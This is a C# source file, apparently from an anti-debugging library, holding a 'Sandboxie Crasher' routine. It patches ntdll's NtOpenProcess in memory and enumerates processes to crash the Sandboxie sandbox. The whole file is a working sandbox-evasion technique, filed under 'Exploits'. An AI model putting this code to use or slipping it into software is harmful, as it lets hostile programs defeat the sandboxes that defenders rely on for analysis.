using System;
using System.Diagnostics;
using System.Runtime.ExceptionServices;
using static AntiDebugLib.Native.AntiDebugLibNative;
using static AntiDebugLib.Native.Kernel32;

namespace AntiDebugLib.Prevention.Exploits
{

    /// <summary>
    /// <list type="bullet">
    /// <item>
    /// AntiCrack-DotNet :: https://github.com/AdvDebug/AntiCrack-DotNet/blob/91872f71c5601e4b037b713f31327dfde1662481/AntiCrack-DotNet/AntiVirtualization.cs#L209
    /// </item>
    /// </list>
    /// </summary>
    public class SandboxieCrasher : PreventionBase
    {
        public override string Name => "Sandboxie Crasher";


        [HandleProcessCorruptedStateExceptions]
        public override PreventionResult PreventPassive()
        {
            if (Environment.Is64BitProcess) // This only works on x86
                return Incompatible();

            byte[] code = { 0xB8, 0x26, 0x00, 0x00, 0x00 };

            try
            {
                var NtOpenProcess = GetProcAddress(MyGetModuleHandle("ntdll.dll"), "NtOpenProcess");
                WriteProcessMemory(GetCurrentProcess(), NtOpenProcess, code, (uint)code.Length, 0);

                foreach (var process in Process.GetProcesses())
                {
                    try
                    {
                        using (var safeHandle = process.SafeHandle)
                        {
                            var isCritical = false;
                            IsProcessCritical(safeHandle, ref isCritical);
                        }
                    }
                    catch
                    {
                        // ignored
                    }
                }
            }
            catch
            {
                // ignored
            }

            return Applied();
        }
    }
}
